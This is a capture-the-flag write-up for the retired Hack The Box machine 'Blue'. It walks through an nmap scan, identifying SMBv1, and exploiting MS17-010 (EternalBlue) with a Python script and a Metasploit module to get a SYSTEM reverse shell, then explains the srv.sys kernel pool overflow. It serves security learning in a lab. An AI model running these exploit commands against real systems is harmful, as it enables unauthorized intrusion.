# Blue(Retired) HTB-CTF
## Machine Information

| Field | Value |
|------|------|
| Machine Name | Blue |
| Difficulty | Easy |
| OS | Windows |
| Vulnerability | MS17-010 |
## Disclaimer
This write-up is for educational purposes only.
<br>The machine is retired from Hack The Box and no longer active.

## Attack Path
1. Perform a full TCP port scan
2. Identify SMB service running on Windows 7 - 10
3. Detect vulnerability MS17-010 (CVE-2017-0143)
4. Exploit the vulnerability to gain SYSTEM shell
5. Retrieve user and root flags
## Reconnaissance
### Nmap Scan
```nmap -Pn -sS -sV -p- -T4 10.129.4.215 -oA tcpAll```
### Result
```
PORT      STATE SERVICE      VERSION                                                                                                                         
135/tcp   open  msrpc        Microsoft Windows RPC                                                                                                           
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn                                                                                                   
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)                                                                    
49152/tcp open  msrpc        Microsoft Windows RPC                                                                                                           
49153/tcp open  msrpc        Microsoft Windows RPC                                                                                                           
49154/tcp open  msrpc        Microsoft Windows RPC                                                                                                           
49155/tcp open  msrpc        Microsoft Windows RPC                                                                                                           
49156/tcp open  msrpc        Microsoft Windows RPC                                                                                                           
49157/tcp open  msrpc        Microsoft Windows RPC
```
The open SMB port suggests a Windows file sharing service

## Enumeration

Further enumeration indicates that the SMB service is running on a Windows 7 – 10 system and supports SMBv1.

Systems running SMBv1 may be vulnerable to **CVE-2017-0143 (MS17-010)**.

MS17-010 is a remote code execution vulnerability in the SMBv1 implementation of Microsoft Windows that allows attackers to execute arbitrary code on the target system.

## Exploitation
### Exploit Used
MS17-010 Remote Code Execution
Example exploit execution:
```python2 MS17_010_exploit.py 10.129.x.x```
Alternatively using Metasploit:
```
msfconsole
```
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.129.x.x
set LHOST <your ip>
run
```
## Foothole
After running the exploit, a reverse shell is obtained verify access:
```
getuid
```
output:
```
Server username: NT AUTHORITY\SYSTEM
```
## Flag
### User Flag
```c:\Users\haris\Desktop\user.txt```
### Root Flag
```C:\Users\Administrator\Desktop\root.txt```

## Vulnerability Analysis: MS17-010 (EternalBlue)
MS17-010 is a critical vulnerability in Microsoft's SMBv1 (Server Message Block) protocol. It became world-famous after being used by the EternalBlue exploit, which was allegedly developed by the NSA and later leaked by the Shadow Brokers.

1. Technical Root Cause: Buffer Overflow in Srv.sys
The vulnerability resides in the Windows kernel-mode driver srv.sys. It is caused by the way the SMBv1 server handles specially crafted packets, specifically involving FEA (File Extended Attributes).

   - Mechanism: When an attacker sends a crafted "SrvTrans2DispatchTable" request, the system fails to properly calculate the size of the buffer needed for the extended attributes.

   - Kernel Pool Overflow: This miscalculation leads to a heap-based buffer overflow in the Non-paged Kernel Pool. Unlike MS08-067 which is a stack-based overflow, this occurs in the heap, making it more complex but extremely powerful.

2. Exploitation: Kernel-Level Control
Because the vulnerability is located within a kernel driver, successful exploitation grants the attacker the highest possible access.

   - Arbitrary Write: The exploit allows the attacker to write arbitrary data into kernel memory.

   - Remote Code Execution (RCE): Attackers typically use this to install a backdoor (like DoublePulsar) that allows them to execute shellcode with SYSTEM privileges without any authentication.

3. Why it was so Impactful
Wormable: Similar to MS08-067, this vulnerability is "wormable," meaning it can self-propagate across a network without any human interaction.

   - Protocol Design Flaw: SMBv1 is an ancient protocol (from the 1980s) that lacked the security-by-design principles of modern SMB versions (v2/v3).

## Tools Used
- Nmap
- Metasploit
- Python exploit
## References
https://nvd.nist.gov/vuln/detail/CVE-2017-0143<br>
https://www.exploit-db.com/exploits/43970